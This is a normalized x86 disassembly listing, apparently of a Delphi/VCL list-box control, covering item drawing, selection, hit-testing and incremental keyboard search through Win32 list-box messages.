call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_438f2c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_438d04
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_4402a8
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_4029f8
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov esi 0x1
sub_438d58
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_44462c
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax ebx
call sub_438d04
sub_438d9c
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop ebx
retn
sub_438e18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
jmp r-xdata
sub_438e78
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_44462c
mov eax ebx
mov si 0xffd0
call sub_403418
sub_438ea0
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_441a58
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_438f2c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
sub_438f7c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_4470c4
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_4470c4
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_4470c4
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
jmp r-xdata
sub_439050
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_44462c
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_43902c
sub_4390a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439150
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439157
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_40442c
mov edx eax
mov eax [ esi + 0x8 ]
call sub_4088cc
mov eax [ ebp - 0x4 ]
call sub_40422c
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43915c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4391f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4391f9
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_40422c
mov [ esi + 0xc ] eax
jmp r-xdata
sub_439214
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43908c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_439240
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_439050
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_439050
jmp r-xdata
sub_439284
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_43908c
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_441a58
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_439310
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_443f18
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_443e44
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_403418
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_439428
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_444044
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_4470c4
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_438d04
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_439df0
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_439214
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d3ac
sub_4394f8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_444428
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_43908c
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_439574
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_444aa0
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_441014
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_444a0c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_4395da
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_45758c
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_441f28
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_440f4c
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406cd4
mov edx esp
mov cl 0x1
mov eax esi
call sub_439284
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_438f2c
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_440f4c
jmp r-xdata
sub_439678
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_4404b0
mov eax esi
mov si 0xffeb
call sub_403418
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403418
jmp r-xdata
pop esi
retn
sub_4396ac
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_4470c4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_4470c4
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_4470c4
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_4470c4
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_4470c4
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_43908c
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_418d68
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_43980c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44521c
push ebp
call sub_4396ac
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_439850
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_4403e8
lea eax [ esp + 0x18 ]
call sub_406ce8
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_4398b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4399bc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_423a28
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4399c3
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edx 0x824
mov eax ebx
call sub_442b84
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_403418
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_439ed4
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_403f6c
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40422c
push eax
mov eax [ ebp - 0x8 ]
call sub_40442c
push eax
mov eax [ ebx + 0x228 ]
call sub_423dcc
push eax
call DrawTextA
sub_4399ec
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_423e4c
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_423cec
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_423d08
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_423a28
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423684
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_422eb8
xor edx edx
mov eax [ esi + 0x228 ]
call sub_423e4c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_439aa8
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_439ad8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4466a4
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_44462c
sub_439b04
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_438f7c
inc edi
dec ebx
jne r-xdata
sub_439b3c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_40442c
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4470c4
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_439f1c
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_403418
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406d08
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4470c4
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_439c20
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_439de0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_446070
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439de7
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_403f90
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_403f6c
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40422c
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40c2c0
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40422c
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4044cc
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40422c
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4044cc
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404154
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_404234
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_4470c4
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_403418
push ebp
call sub_439b3c
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40422c
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404154
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_404154
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_4042ec
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_439df0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439ec4
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439ecb
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_439ef4
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_439f1c
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_439f5c
push ebx
push esi
